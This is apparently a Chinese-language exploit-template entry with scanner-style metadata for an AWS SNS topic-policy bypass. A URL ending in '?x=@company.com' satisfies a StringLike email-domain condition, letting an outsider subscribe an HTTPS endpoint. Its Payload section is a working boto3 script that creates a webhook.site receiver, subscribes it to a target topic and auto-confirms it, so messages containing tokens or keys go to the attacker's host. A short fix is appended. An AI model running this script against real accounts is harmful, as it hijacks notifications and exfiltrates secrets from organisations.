---
id: SNS-SUBSCRIBE-PROTOCOL-BYPASS
title: SNS 订阅条件绕过 — HTTPS 协议 Endpoint 构造
product: aws-sns
vendor: Amazon
severity: HIGH
tags: [authorization-bypass, sns, aws, subscription-hijack]
fingerprint: ["sns", "aws", "Subscribe", "StringLike", "Endpoint"]
---

## 漏洞描述

AWS SNS Topic Policy 使用 `StringLike` 条件限制订阅 Endpoint（如 `*@company.com`）时，不同协议对 Endpoint 的解释不同。email 协议的 Endpoint 是邮箱地址，而 HTTPS 协议的 Endpoint 是 URL。攻击者可以构造包含 `@company.com` 的 URL 来满足条件，将 SNS 消息重定向到攻击者控制的 webhook。

## 前置条件

- SNS Topic Policy 允许 `Principal: *` 订阅
- 条件使用 `StringLike` 且包含通配符（如 `*@company.com`）
- 攻击者知道 SNS Topic ARN

## 利用步骤

1. 创建 webhook.site 临时端点
2. 构造满足条件的 HTTPS URL：`https://webhook.site/UUID?x=@company.com`
3. 使用 HTTPS 协议订阅 SNS Topic
4. 访问 SubscribeURL 确认订阅
5. 触发业务流程，webhook 收到所有 SNS 消息（含 Token/密钥）

## Payload

```python
import boto3, json, urllib.request, time

TOPIC_ARN = "arn:aws:sns:us-east-1:TARGET_ACCOUNT:TopicName"

# 创建 webhook
resp = urllib.request.urlopen(urllib.request.Request(
    'https://webhook.site/token', data=b'',
    headers={'Accept': 'application/json'}, method='POST'))
wh_uuid = json.loads(resp.read())['uuid']

# 订阅（绕过 *@company.com 条件）
sns = boto3.client('sns', region_name='us-east-1')
sns.subscribe(
    TopicArn=TOPIC_ARN, Protocol='https',
    Endpoint=f"https://webhook.site/{wh_uuid}?x=@company.com")

# 确认订阅
time.sleep(5)
reqs = json.loads(urllib.request.urlopen(urllib.request.Request(
    f"https://webhook.site/token/{wh_uuid}/requests?sorting=newest",
    headers={'Accept': 'application/json'})).read())
for r in reqs.get('data', []):
    body = json.loads(r.get('content', '{}'))
    if body.get('Type') == 'SubscriptionConfirmation':
        urllib.request.urlopen(body['SubscribeURL'])
        print("[+] Subscription confirmed!")
        break
```

## 验证方法

触发 SNS Publish 后，webhook.site 收到 Notification 消息，内容包含被拦截的 Token 或敏感数据。

## 修复建议

限制订阅协议为 email：
```json
{"Condition": {"StringEquals": {"sns:Protocol": "email"}, "StringLike": {"sns:Endpoint": "*@company.com"}}}
```
